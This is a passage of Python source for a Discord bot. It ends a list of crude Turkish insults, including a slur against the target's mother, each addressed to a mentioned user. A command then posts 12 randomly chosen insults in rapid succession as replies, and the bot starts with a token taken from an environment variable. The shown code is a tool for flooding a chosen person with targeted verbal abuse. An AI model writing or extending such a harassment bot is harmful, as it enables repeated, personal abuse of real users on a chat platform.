        f"{user.mention} orospu evladı seniiii!",
        f"{user.mention} anneni pazarlamayı bırak"
    ]
    
    for i in range(12):
        mesaj = random.choice(ezilme_mesajlari)
        await ctx.reply(mesaj)
        await asyncio.sleep(0.5)

TOKEN = os.environ.get('DISCORD_BOT_TOKEN')
if TOKEN:
    bot.run(TOKEN)
else:
    print("DISCORD_BOT_TOKEN bulunamadı! Lütfen Secrets bölümüne token'ınızı ekleyin.")
